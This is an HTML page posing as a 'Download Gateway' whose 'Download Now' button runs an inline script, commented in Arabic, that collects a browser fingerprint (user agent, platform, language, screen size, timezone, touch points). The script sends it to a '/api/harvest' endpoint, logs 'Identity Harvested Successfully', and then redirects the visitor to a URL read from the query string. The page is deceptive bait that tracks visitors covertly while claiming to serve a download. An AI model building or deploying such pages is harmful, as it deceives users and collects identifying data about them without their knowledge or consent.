
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download Gateway</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-900 text-white flex items-center justify-center h-screen">

    <div class="bg-white/10 backdrop-blur-lg p-8 rounded-3xl text-center max-w-sm w-full mx-4 border border-white/20">
        <h1 class="text-2xl font-bold mb-4">Link Ready</h1>
        <p class="text-gray-300 mb-8">Click the button below to start download</p>

        <button id="downloadBtn" onclick="captureAndRedirect()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl transition">
            Download Now
        </button>
    </div>

    <script>
        // دالة الحصاد المباشرة - أخرجناها من الملف الخارجي لتكون هنا
        async function harvestFingerprint() {
            const fingerprint = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                touchPoints: navigator.maxTouchPoints,
                timestamp: new Date().toISOString()
            };

            try {
                // إرسال البيانات فوراً للسيرفر الخاص بك
                await fetch('/api/harvest', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ fingerprint })
                });
                console.log("✅ Identity Harvested Successfully");
            } catch (err) {
                console.error("❌ Harvest Failed:", err);
            }
        }

        async function captureAndRedirect() {
            const btn = document.getElementById('downloadBtn');
            
            // 1. استخراج الرابط
            const urlParts = window.location.href.split('url=');
            const targetUrl = urlParts.length > 1 ? decodeURIComponent(urlParts[1]) : 'https://google.com';

            // 2. تغيير شكل الزر
            btn.innerText = "Processing...";
            btn.disabled = true;

            // 3. 🎣 تنفيذ الحصاد فوراً (الأولوية القصوى)
            await harvestFingerprint();

            // 4. التوجيه بعد ضمان إرسال الطلب
            window.location.href = targetUrl;
        }
    </script>
</body>
</html>
